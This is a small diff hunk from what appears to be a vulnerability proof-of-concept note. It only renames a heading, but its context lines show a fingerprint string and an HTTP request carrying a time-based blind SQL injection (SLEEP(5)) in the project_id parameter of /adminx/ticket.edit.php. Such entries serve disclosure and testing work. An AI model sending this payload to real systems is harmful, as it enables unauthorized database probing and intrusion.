@@ -8,7 +8,7 @@
 body="不要着急，点此"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(5)))OKTO) HTTP/1.1
